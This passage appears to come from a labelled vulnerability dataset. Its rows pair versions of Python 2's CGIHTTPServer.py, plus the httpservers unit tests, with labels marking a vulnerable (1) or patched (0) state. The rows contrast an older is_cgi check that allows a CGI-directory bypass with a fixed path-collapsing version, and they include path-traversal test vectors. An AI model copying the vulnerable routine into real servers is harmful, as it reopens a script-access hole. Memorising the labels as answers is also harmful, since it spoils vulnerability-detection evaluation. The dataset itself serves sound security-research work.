        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1
12,c5abced949e6a4b001d1dee321593e74ecadecfe,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0
13,c5abced949e6a4b001d1dee321593e74ecadecfe,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
